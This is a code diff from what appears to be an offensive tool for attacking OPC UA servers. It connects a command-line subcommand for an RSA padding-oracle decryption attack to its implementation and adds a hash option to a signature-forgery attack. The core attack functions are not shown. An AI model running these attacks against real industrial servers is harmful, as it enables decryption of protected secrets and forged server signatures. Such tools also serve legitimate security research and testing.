@@ -227,15 +227,20 @@ to grab a password payload.
 """.strip()
   
   def add_arguments(self, aparser):
-    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'),
+    aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
       help='which PKCS#1 padding oracle to use; default: try-both')
-    aparser.add_argument('server-url', type=str,
+    aparser.add_argument('url', type=str,
       help='endpoint URL of the OPC UA server owning the RSA key pair the ciphertext was produced for')
     aparser.add_argument('ciphertext', type=str,
       help='hex-encoded RSA-encrypted ciphertext; either OAEP or PKCS#1')
     
   def execute(self, args):
-    raise Exception('TODO: implement')
+    opn, password = {
+      'opn'     : (True,  False),
+      'password': (False, True),
+      'try-both': (True,  True),
+    }[args.padding_oracle_type]
+    decrypt_attack(args.url, unhexlify(args.ciphertext), opn, password)
   
 
 class SigForgeAttack(Attack):
@@ -257,6 +262,8 @@ to show the concept in isolation or perform some follow-up attack.
   def add_arguments(self, aparser):
     aparser.add_argument('-t', '--padding-oracle-type', choices=('opn', 'password', 'try-both'), default='try-both',
       help='which PKCS#1 padding oracle to use; default: try-both')
+    aparser.add_argument('-H', '--hash-function', choices=('sha1', 'sha256'), default='sha256',
+      help='hash function to use in signature computation; default: sha256')
     aparser.add_argument('server-url', type=str,
       help='endpoint URL of the OPC UA server whose private key to spoof a signature with')
     aparser.add_argument('payload', type=str, 
@@ -268,7 +275,7 @@ to show the concept in isolation or perform some follow-up attack.
       'password': (False, True),
       'try-both': (True,  True),
     }[args.padding_oracle_type]
-    forge_signature_attack(args.server_url, unhexlify(args.payload), opn, password)
+    forge_signature_attack(args.server_url, unhexlify(args.payload), opn, password, args.hash_function)
 
 class MitMAttack(Attack):
   subcommand = 'mitm'
